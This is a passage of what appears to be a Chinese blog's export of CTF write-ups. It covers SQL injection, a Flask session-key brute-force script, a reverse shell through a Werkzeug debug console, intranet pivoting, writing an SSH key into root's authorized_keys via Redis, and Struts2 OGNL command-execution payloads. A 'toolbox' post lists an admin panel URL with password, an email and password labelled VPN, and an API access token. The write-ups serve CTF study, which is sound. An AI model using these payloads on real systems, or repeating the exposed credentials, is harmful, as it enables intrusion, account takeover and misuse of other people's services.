dK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==\")\n\nclass MyHandler(http.server.BaseHTTPRequestHandler):\ndef do_GET(self):\ntry:\nif self.path == \"/\":\nself.send_response(200)\nself.end_headers()\nself.wfile.write(__page__)\nelse:\nself.send_response(404)\nself.end_headers()\nself.wfile.write(b\"404 Not Found\")\nexcept Exception as e:\nprint(e)\nself.send_response(500)\nself.end_headers()\nself.wfile.write(b\"500 Internal Server Error\")\n\ndef do_POST(self):\ntry:\nif self.path == \"/login\":\nbody = self.rfile.read(int(self.headers.get(\"Content-Length\")))\npayload = json.loads(body)\nparams = json.loads(decrypt(payload[\"params\"]))\nprint(params)\nif params.get(\"username\") == \"admin\":\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\")\nprint(\"admin\")\nreturn\nif params.get(\"username\") == params.get(\"password\"):\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\")\nprint(\"same\")\nreturn\nhashed = gethash(params.get(\"username\"),params.get(\"password\"))\nfor k,v in hashed_users.items():\nif hashed == v:\ndata = {\n\"user\":k,\n\"hash\":hashed,\n\"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\"\n}\nself.send_response(200)\nself.end_headers()\nself.wfile.write(json.dumps(data).encode())\nprint(\"success\")\nreturn\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"Invalid username or password\")\nelse:\nself.send_response(404)\nself.end_headers()\nself.wfile.write(b\"404 Not Found\")\nexcept Exception as e:\nprint(e)\nself.send_response(500)\nself.end_headers()\nself.wfile.write(b\"500 Internal Server Error\")\n\nif __name__ == \"__main__\":\nserver = http.server.HTTPServer((\"\", 9999), MyHandler)\nserver.serve_forever()\n```\n\n登录逻辑\n\n```javascript\nif self.path == \"/login\":\n                body = self.rfile.read(int(self.headers.get(\"Content-Length\")))\n                payload = json.loads(body)\n                params = json.loads(decrypt(payload[\"params\"]))\n                print(params)\n                if params.get(\"username\") == \"admin\":\n                    self.send_response(403)\n                    self.end_headers()\n                    self.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\")\n                    print(\"admin\")\n                    return\n                if params.get(\"username\") == params.get(\"password\"):\n                    self.send_response(403)\n                    self.end_headers()\n                    self.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\")\n                    print(\"same\")\n                    return\n                hashed = gethash(params.get(\"username\"),params.get(\"password\"))\n                for k,v in hashed_users.items():\n                    if hashed == v:\n                        data = {\n                            \"user\":k,\n                            \"hash\":hashed,\n                            \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\"\n                        }\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(json.dumps(data).encode())\n                        print(\"success\")\n                        return\n                self.send_response(403)\n                self.end_headers()\n                self.wfile.write(b\"Invalid username or password\")\n```\n\n确认了json里username和password不能相同后，经过一个hash函数\n\n```javascript\ndef gethash(*items):\n    c = 0\n    for item in items:\n        if item is None:\n            continue\n        c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough?\n    return hex(c)[2:]\n```\n\n这一坨处理是消除了类型限制，因此使用不同类型的username和password即可\n\n```\n{\"username\": \"1\", \"password\": 1}\n```\n\n经过decrypt函数的五次base64后post\n\n```plain\nPOST /login HTTP/1.1\nHost: localhost:59959\nContent-Length: 157\nsec-ch-ua: \nsec-ch-ua-platform: \"\"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nAccept: */*\nOrigin: http://localhost:59959\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:59959/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n{\"params\":\"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsWlZNV2gzVkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZVeFpIZFNiVlpXVFZSV1ZHRnRjems9\"}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692179475244-11f233f9-1301-45b6-aca4-1592f4ae426b.png)\n\n# 出去旅游的心海\n\n抓包可以发现一个路由`wp-content/plugins/visitor-logging/logger.php`\n\n获得源码\n\n```javascript\n<?php\n/*\nPlugin Name: Visitor auto recorder\nDescription: Automatically record visitor's identification, still in development, do not use in industry environment!\nAuthor: KoKoMi\n  Still in development! :)\n*/\n\n// 不许偷看！这些代码我还在调试呢！\nhighlight_file(__FILE__);\n\n// 加载数据库配置，暂时用硬编码绝对路径\nrequire_once('/var/www/html/wordpress/' . 'wp-config.php');\n\n$db_user = DB_USER; // 数据库用户名\n$db_password = DB_PASSWORD; // 数据库密码\n$db_name = DB_NAME; // 数据库名称\n$db_host = DB_HOST; // 数据库主机\n\n// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下\n// 这些是临时的代码\n\n$ip = $_POST['ip'];\n$user_agent = $_POST['user_agent'];\n$time = stripslashes($_POST['time']);\n\n$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);\n\n// 检查连接是否成功\nif ($mysqli->connect_errno) {\n    echo '数据库连接失败: ' . $mysqli->connect_error;\n    exit();\n}\n\n$query = \"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)\";\n\n// 执行插入\n$result = mysqli_query($mysqli, $query);\n\n// 检查插入是否成功\nif ($result) {\n    echo '数据插入成功';\n} else {\n    echo '数据插入失败: ' . mysqli_error($mysqli);\n}\n\n// 关闭数据库连接\nmysqli_close($mysqli);\n\n//gpt真好用\n```\n\ntime处可以进行sql注入\n\n这里我用的是报错注入\n\n```javascript\n1 and extractvalue(1,concat(0x7e,user(),0x7e,database()))\n1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))\n#secret_of_kokomi,visitor_record 爆库\n1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_of_kokomi')))\n#id,content 爆字段\n1 and extractvalue(1,concat(0x7e,(select group_concat(id,content) from secret_of_kokomi))) 爆内容\n1 and extractvalue(1,concat(0x7e,(mid((select group_concat(id,content) from secret_of_kokomi),47,70))))\n适当拼接即可\nmoectf{Dig_Thr0ugh_Eve2y_C0de\nThr0ugh_Eve2y_C0de_3nd_Poss1bIl\ne2y_C0de_3nd_Poss1bIlIti3s!!}\n```\n\n就是有一个问题这里报错注入最后flag显示不出来 要用mid函数去适当的调整 当时就是栽了跟头\n\n还有一种就是直接`(user())`进行查询就行 。。。\n\n# moworld\n\n一道很综合考察内网渗透的题目 非常的不错 可以学到很多知识\n\n压缩包密码为上一题的flag\n\n首先是一个flask框架 给了提示需要我们去伪造session\n\n```javascript\n记录一下搭建留言板的过程\n首先确定好web框架，笔者选择使用简单的flask框架。\n然后使用强且随机的字符串作为session的密钥。\napp.secret_key = \"This-random-secretKey-you-can't-get\" + os.urandom(2).hex()\n最后再写一下路由和数据库处理的函数就完成啦！！\n身为web手的我为了保护好服务器，写代码的时候十分谨慎，一定不会让有心人有可乘之机！\n```\n\n可以看到session的构成 然后去网上找了下 发现是某次的美团CTF上的题目\n\n直接拿来脚本用即可\n\n```javascript\n# -*- coding: utf-8 -*-\n# @Time : 2022/9/17 9:11\n# @Author : pysnow\nimport os\n\n# standard imports\nimport sys\nimport zlib\nfrom itsdangerous import base64_decode\nimport ast\n\n# Abstract Base Classes (PEP 3119)\nif sys.version_info[0] < 3:  # < 3.0\n    raise Exception('Must be using at least Python 3')\nelif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4\n    from abc import ABCMeta, abstractmethod\nelse:  # > 3.4\n    from abc import ABC, abstractmethod\n\n# Lib for argument parsing\nimport argparse\n\n# external Imports\nfrom flask.sessions import SecureCookieSessionInterface\n\n\nclass MockApp(object):\n\n    def __init__(self, secret_key):\n        self.secret_key = \"This-random-secretKey-you-can't-get\"+secret_key\n\n\nclass FSCM(ABC):\n    def encode(secret_key, session_cookie_structure):\n        \"\"\" Encode a Flask session cookie \"\"\"\n        try:\n            app = MockApp(secret_key)\n\n            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))\n            si = SecureCookieSessionInterface()\n            s = si.get_signing_serializer(app)\n\n            return s.dumps(session_cookie_structure)\n        except Exception as e:\n            return \"[Encoding error] {}\".format(e)\n            raise e\n\n    def decode(session_cookie_value, secret_key=None):\n        \"\"\" Decode a Flask cookie  \"\"\"\n        try:\n            if (secret_key == None):\n                compressed = False\n                payload = session_cookie_value\n\n                if payload.startswith('.'):\n                    compressed = True\n                    payload = payload[1:]\n\n                data = payload.split(\".\")[0]\n\n                data = base64_decode(data)\n                if compressed:\n                    data = zlib.decompress(data)\n\n                return data\n            else:\n                app = MockApp(secret_key)\n\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.loads(session_cookie_value)\n        except Exception as e:\n            return \"[Decoding error] {}\".format(e)\n            raise e\n\n\ndic = '0123456789abcdef'\nif __name__ == '__main__':\n    for i in dic:\n        for j in dic:\n            for k in dic:\n                for l in dic:\n                    key = i + j + k + l\n                    res = FSCM.decode('eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZO9evg.Xms6P6EytB2HM4UvqW128bZDB-8', key)\n                    # print(res)\n                    if 'user' in str(res):\n                        print(key)\n                        exit()\n```\n\n爆破出后四位 或者自己让gpt写一个字典慢慢跑都行\n\n然后伪造session 可以看到提示\n\n```javascript\n今天测试留言板的时候发现我的调试模式给出的pin码一直是904-474-531不变，真是奇怪呢\n不过这个泄露了貌似很危险，别人就可以进我的console执行任意python代码了！\n一定不能泄露出去！！！！\n```\n\n给了我们ping码 就可以知道它开启了debug模式\n\n直接访问`/console`路由\n\n进行反弹shell\n\n获得第一段flag 再查看`/readme`并且得到提示\n\n```javascript\n恭喜你通过外网渗透拿下了本台服务器的权限\n接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan\n你需要了解它的基本用法，然后扫描内网的ip段\n如果你进行了正确的操作，会得到类似下面的结果\n10.1.11.11:22 open\n10.1.23.21:8080 open\n10.1.23.23:9000 open\n将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）\n注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务\n```\n\n`ifconfig` 命令没有 还可以用`hostname -I `获取存活的ip地址\n\n可以得到两端 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693568306191-a3a36e21-6dd5-4b8d-8063-2176d62e53a2.png)\n\n然后进行fscan 扫描c段\n\n获得密码`22-3306-6379-8080` 再将压缩包中flag解出 获得提示\n\n```javascript\n当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果\n可以看到，在本内网下还有另外两台服务器\n其中一台开启了22(ssh)和6379(redis)端口\n另一台开启了3306(mysql)端口\n还有一台正是你访问到的留言板服务\n接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器\n此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件\n连接代理，推荐`proxychains`\n对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2\n对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3\n```\n\n那么我们要去连接它内网下的其他服务器  我们就要进行内网穿透做隧道\n\n首先就是用一台vps去连接跳板机 然后通过跳板机做隧道将内网中服务器暴露在公网中 这样我们就可以用我们的物理机去连接到了\n\n大致就是 `172.21.0.2:xxxx(内网服务器)->跳板机ip:xxxxx->我们的vps<-某种⼯具连接这个隧道<-攻击机  `\n\n这里我用的是NPS\n\n一开始我用的tcp隧道 就是我们可以直接去连接我的vps和指定隧道端口直接连接他的内网服务器\n\n但是这里我并不能连接成功redis 就很奇怪\n\n之后我用socks并且`proxifier`  做了个代理 就不用去用我的vps ip了 直接就是`127.0.20.x:3306`就可以连接到他的内网中mysql服务器 \n\n配置什么的都要做好 包括容许走它的隧道应用等\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693569252355-b48b428a-f041-4125-ab6b-e5c3342fe830.png)\n\n连接上去之后 可以在表中发现第二段flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693409847033-1ac482a8-1691-48f8-9e01-2d5064da6705.png)\n\n第三段是redis公钥登录服务器 \n\n大致过程与条件：\n\n1. 客户端生成私钥和公钥，将公钥拷贝给服务器端\n2. 客户端发起登录请求\n3. 服务器端根据客户端发来的信息查找是否存有该客户端的公钥，\n4. 客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证\n5. 服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对\n\n### **条件：**\n\n- Redis服务使用ROOT账号启动\n- 服务器开放了SSH服务，而且允许使用密钥登录。\n\n首先用工具连接到redis服务器 只要隧道搭建没问题都能连上 就是这个环境太折磨人了 \n\n不过也没办法 能体会到出题人的一片苦心 只怪搅屎棍太多了 素质太差\n\n需要注意的是ip会发生变化是动态的 连接不上的的时候一定要去再看看 而且题目环境会隔一段时间重启\n\n 首先在自己攻击机申请公私钥 将私钥保存在自己物理机上 \n\n```javascript\nssh-keygen -t rsa # ⽣成公钥和私钥\nredis服务器写入\nset x \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVuidivu8ahaTWtPekYXjkm0ya2rJ9uYFXQ6ca0GO9ny478xL8sU6Qg3Cpzr1/uWGOahpACX2CLjnkRxiZAuxwymqGyq0/jYoLLuGfKCIOdb/WL5mcsdubiVvjC4jWSLIvlwB/rk2LS5DNC2+fnBGuVKDRNLn6BY4w8vRdqowA9/Gy5+gJwBR9TY1J6KQUTc0LXNasQIhBbqXYTQwfcqdhBs929Uq5yOIs+1KawJJrmkWkENvbat7BphjlUhvZUrynEpCNZ0kJVxq2Pj4ltks1WMknE+cES10LJQDSlhjxNuED52QPdcIjqtKUZZk3P7hKwLmO782D3/stPQ0Q4RMWeaUvJLRFLtep1uf+O5YQTtJ8NJzFP+nntNX/NB7HKk4dIy+PnQOh1TaEAAWXK5TR6SgrRttAUcZzhrbTjNNvqRHq9VJplE7hFoaqJXQhD7x7UgjPJqK8kP0b/kpza68+ljgD7PZJSUl7q5gJ5yicGvBUNht/6Y/qqn4KonDpYH8=\\n\"\nconfig set dir /root/.ssh\nconfig set dbfilename authorized_keys\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693570658936-a03a4b9b-acca-46c8-bc6a-a3a5173fff98.png)\n\n然后用私钥ssh 22端口链接即可\n\n然后就能得到最后一段flag\n\n被环境折磨。。。\n\n收获还是颇多 很值得\n","categories":["各赛事WP"]},{"title":"hw工具箱","url":"/post/b361a80b.html","content":"\nnothing here\n\n<!--more-->\n\n可利用的脚本以及教程\n\nhttps://github.com/Ta0ing/captcha-killer-java8 插件\n\nhttps://www.wangan.com/p/7fy7f367c2406ae1  密码本\n\n宝塔：\n\nhttps://114.116.119.253:5003/login admin/boogipop158!\n\nVPN\n\n```php\n2277273817@qq.com\nlzwluozhiwen57\n```\n\n\n\nbp验证码接口配置:\n\n```php\nPOST /rest/2.0/ocr/v1/accurate?access_token=24.c401e953b9cd40fe15b3c3880787b2db.2592000.1693830979.282335-37231824 HTTP/1.1\nHost: aip.baidubce.com\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nSec-Fetch-Site: none\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 55\n\nimage=<@URLENCODE><@BASE64><@IMG_RAW></@IMG_RAW></@BASE64></@URLENCODE>\n```\n"},{"title":"XCTF简单记录","url":"/post/85812b61.html","content":"\nweb狗没啥参与感\n\n<!--more-->\n\n# WEB\n\nweb就一道题目 \n\n## jwt2struts\n\n考点：\n\n哈希长度扩展攻击 jwt伪造 structs2 s2-016\n\n源码发现`JWT_key.php`\t \n\n获得源码\n\n```php\n<?php\n  highlight_file(__FILE__);\ninclude \"./secret_key.php\";\ninclude \"./salt.php\";\n//$salt = XXXXXXXXXXXXXX // the salt include 14 characters\n//md5($salt.\"adminroot\")=e6ccbf12de9d33ec27a5bcfb6a3293df\n@$username = urldecode($_POST[\"username\"]);\n@$password = urldecode($_POST[\"password\"]);\nif (!empty($_COOKIE[\"digest\"])) {\n  if ($username === \"admin\" && $password != \"root\") {\n    if ($_COOKIE[\"digest\"] === md5($salt.$username.$password)) {\n      die (\"The secret_key is \". $secret_key);\n    }\n    else {\n      die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n    }\n  }\n  else {\n    die (\"no no no\");\n  }\n}\n```\n\n大致浏览 就是要么我们能得到他的盐值 要么输入密码为root 但是又不容许我们输入密码为root\n\n总之就是要让`$_COOKIE[\"digest\"] === md5($salt.$username.$password)`成立\n\n直接用hashpump参考https://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&request_id=&biz_id=102&utm_term=hashpump&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&spm=1018.2226.3001.4187\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690788963635-a551229f-e941-4ec8-a654-cd95298a7d88.png)\n\n得到之后打入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789103062-9ee0da7c-da07-4285-bdf4-1cb8e0e84fb6.png)\n\n得到jwt的key为`sk-he00lctf3r`然后伪造登录\n\n发现源码提示 do you know struts2?\n\n当用户提交 age 为字符串而非整形数值时，后端用代码拼接 \"'\" + value + \"'\" 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式  \n\n官方wp是在age注入`%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27` 但是我之后复现没成功 没有回显\n\n但是我的payload是这样 可能是非预期 来源 https://xz.aliyun.com/t/4603\n\n```\n/admiiiiiiiiiiin/user.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /flag%27%29.getInputStream%28%29%29%7D\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789835158-46956817-70ad-4e98-8494-b82ba94c3915.png)\n\n# Misc\n\n## snippingTools\n\nCVE-2023-28303  \n\n比赛的时候找到工具了 没试 我TM。。。。\n\nhttps://github.com/frankthetank-music/Acropalypse-Multi-Tool 直接用工具梭哈恢复就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787514977-7cf9931f-6f99-436e-9048-ffe0dda8874e.png)\n\n## old language\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787906068-9d4f095e-a3c1-4ec2-887c-e53980fa8cc8.png)\n\n太离谱了这个 \n\n龙语，游戏《上古卷轴V：天际》中出现的语言\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787993320-76273c76-7cba-48e8-a7c2-6f63851b7730.jpeg)\n\n***ctf{GIKRVZY}** \n","categories":["各赛事WP"]},{"title":"DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习","url":"/post/731522c3.html","content":"\n又能学到很多不知道的知识 满足感up up up!\n\n<!--more-->\n\n# EzFlask\n\n跟标题就是flask有关的 进入题目直接给了源码\n\n```python\nimport uuid\n\nfrom flask import Flask, request, session\nfrom secret import black_list\nimport json\n\napp = Flask(__name__)\napp.secret_key = str(uuid.uuid4())\n\ndef check(data):\n    for i in black_list:\n        if i in data:\n            return False\n    return True\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\nclass user():\n    def __init__(self):\n        self.username = \"\"\n        self.password = \"\"\n        pass\n    def check(self, data):\n        if self.username == data['username'] and self.password == data['password']:\n            return True\n        return False\n\nUsers = []\n\n@app.route('/register',methods=['POST'])\ndef register():\n    if request.data:\n        try:\n            if not check(request.data):\n                return \"Register Failed\"\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Register Failed\"\n            User = user()\n            merge(data, User)\n            Users.append(User)\n        except Exception:\n            return \"Register Failed\"\n        return \"Register Success\"\n    else:\n        return \"Register Failed\"\n\n@app.route('/login',methods=['POST'])\ndef login():\n    if request.data:\n        try:\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Login Failed\"\n            for user in Users:\n                if user.check(data):\n                    session[\"username\"] = data[\"username\"]\n                    return \"Login Success\"\n        except Exception:\n            return \"Login Failed\"\n    return \"Login Failed\"\n\n@app.route('/',methods=['GET'])\ndef index():\n    return open(__file__, \"r\").read()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5010)\n```\n\n大致看一眼 经典的python原型链污染 当时做的时候也成功登录了 \n\n但是我不知道污染哪里这个题目 应该是我没见过的知识点\n\n## 预期解：\n\n其实最重要的一部分我反而没有看到 qwq \n\n```python\n@app.route('/',methods=['GET'])\ndef index():\n    return open(__file__, \"r\").read()\n```\n\n`__file__`：当前脚本运行的路径 